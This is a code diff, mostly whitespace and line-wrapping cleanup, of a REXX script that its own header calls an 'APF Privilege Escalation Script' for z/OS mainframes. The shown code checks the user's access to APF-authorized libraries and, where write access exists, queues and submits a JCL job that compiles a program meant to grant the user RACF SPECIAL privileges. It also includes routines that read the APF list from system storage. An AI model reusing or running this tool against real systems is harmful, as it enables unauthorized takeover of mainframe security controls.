@@ -3,7 +3,7 @@
 /****************************************************************************/
 /*  ELV.APF is a tool to list APF authorized libraries and their privileges */
 /*  If a library has the ALTER/UPDATE privilege, the tool can submit a JOB  */
-/*  that compiles and launches a Prog to grant your user SPECIAL privileges */  
+/*  that compiles and launches a Prog to grant your user SPECIAL privileges */
 /*                                                                          */
 /*  No new techniques really but it's a handy script                        */
 /*                                                                          */
@@ -23,15 +23,16 @@ parse source . . prg . name . . space .
 
 say "+ APF Privilege Escalation Script"
 
-if verbose == 'verbose' then do 
+if verbose == 'verbose' then do
     verbose = 1
     say '+ Verbose mode turned on'
 end
-else 
+else
     verbose = 0
 
 if dsn_input == "" then do
-    say "Usage: ex '"||name||"' 'list' to list apf libraries and their privileges"
+    say "Usage: ex '"||name||"' 'list' to list apf libraries and "||,
+  "their privileges"
     say "       ex '"||name||"' 'APF_DSN' to have the SPECIAL privilege "
     say "       ex '"||name||"' 'list verbose'"
     exit(-1)
@@ -40,37 +41,38 @@ end
 if translate(dsn_input) =="LIST" then do
     list_apf()
 end
-else do    
+else do
     call listdsi "'"dsn_input"'"
-    
+
     if sysdsorg <> "PO" then do
         say "! Cannot find APF Library '"dsn_input"', or not PDS"
         exit(-1)
-    end    
-    
+    end
+
     priv  =  check_priv(dsn_input)
-    
+
     if (priv == "NONE") then do
         say "! Not enough privileges to alter APF library "dsn_input
         exit(-1)
     end
-    
+
     if (priv == "READ") then do
         say "! Not enough privileges to alter APF library "dsn_input
         exit(-1)
     end
     if priv=="NO RACF PROFILE" then do
-        say "! Warning: No RACF profile defined for "dsn_input", might not be uptable"
+        say "! Warning: No RACF profile defined for"||,
+   ""dsn_input", might not be uptable"
     end
-    
+
     launch_payload(dsn_input)
-    
+
 end
 
 
 launch_payload:
-    APF_DSN = arg(1)   
-    PROG = rand_char(6)    
+    APF_DSN = arg(1)
+    PROG = rand_char(6)
     say "+ Compiling " PROG "in" dsn_input
     QUEUE "//ELVAPF  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
     QUEUE "//*"
@@ -118,10 +120,10 @@ launch_payload:
     QUEUE "//SYSTSPRT DD SYSOUT=*"
     QUEUE "//*"
     QUEUE "$$"
-    
-    o = OUTTRAP("output.",,"CONCAT")       
+
+    o = OUTTRAP("output.",,"CONCAT")
     address tso "SUBMIT * END($$)"
-    o = OUTTRAP(OFF) 
+    o = OUTTRAP(OFF)
 
     exit(0)
 
@@ -170,7 +172,7 @@ list_apf:
          if verbose then
             say "+" DSN.NUMAPF "-->" PRIV.NUMAPF
          else if PRIV.NUMAPF == 'ALTER' then
-            say "+" DSN.NUMAPF "-->" PRIV.NUMAPF 
+            say "+" DSN.NUMAPF "-->" PRIV.NUMAPF
          CKSMS = Storage(D2x(AFIRST+4),1)        /* DSN of APF library   */
          if  bitand(CKSMS,'80'x)  = '80'x        /*  SMS data set?       */
            then VOL.NUMAPF = '*SMS* '            /* SMS control dsn      */
